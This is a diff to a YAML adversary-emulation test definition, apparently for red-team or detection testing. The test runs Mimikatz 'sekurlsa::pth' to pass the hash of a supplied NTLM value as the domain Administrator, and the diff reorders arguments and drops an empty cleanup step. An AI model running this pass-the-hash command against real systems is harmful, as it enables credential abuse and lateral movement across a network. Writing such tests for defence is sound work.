@@ -4,6 +4,9 @@ description: |
     Note: must dump hashes first
     [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
 args:
+    - name: mimikatz_path
+      type: path
+      default: '%tmp%\\mimikatz\\x64\\mimikatz.exe'
     - name: user_name
       type: string
       default: Administrator
@@ -13,9 +16,6 @@ args:
     - name: domain
       type: string
       default: '%userdnsdomain%'
-    - name: mimikatz_path
-      type: path
-      default: '%tmp%\mimikatz\x64\mimikatz.exe'
 uuid: ec23cef9-27d9-46e4-a68d-6f75f7b86908
 mitre:
     tactics:
@@ -37,6 +37,3 @@ steps:
       inline: |
         {{.Args.mimikatz_path}} "sekurlsa::pth /user:{{.Args.user_name}} /domain:{{.Args.domain}} /ntlm:{{.Args.ntlm}}"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
